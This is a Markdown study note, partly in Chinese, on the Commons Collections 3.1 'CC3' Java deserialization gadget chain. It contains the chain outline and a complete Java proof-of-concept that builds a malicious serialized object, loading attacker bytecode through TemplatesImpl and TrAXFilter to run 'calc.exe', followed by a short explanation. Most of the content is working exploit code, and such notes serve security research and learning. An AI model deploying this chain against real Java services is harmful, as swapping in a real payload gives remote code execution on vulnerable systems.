# cc3

## Gadget chain&Requires

```
将cc1中的InvokerTransformer替换为InstantiateTransformer
Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
									InstantiateTransformer.transform()
										TrAXFilter.newInstance()
											TemplatesImpl.newTransformer()
Requires:
    Apache Commons Collections 3.1
    jdk1.7
```

## poc

```java
package com.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.utils.Gadgets;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static com.utils.Gadgets.setFieldValue;

public class CC3 {
    public static Object getObject() throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl("calc.exe", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templatesImpl } )};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        InvocationHandler exp = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);

        setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return exp;

    }
}
```

## analysis

将cc1中的InvokerTransformer替换为InstantiateTransformer

![image-20220526010853726](C:\Users\Liyc\Desktop\java反序列化\cc3\cc3.assets\image-20220526010853726.png)

`InstantiateTransformer.transform()`里传来的参数就是`new ConstantTransformer(TrAXFilter.class)`返回的`TrAXFilter.class`，也就是说接下来实例化`TrAXFilter`

而这个类的构造函数中恰好调用了newTransformer()，最后加载恶意字节码

![image-20220526010808230](C:\Users\Liyc\Desktop\java反序列化\cc3\cc3.assets\image-20220526010808230.png)
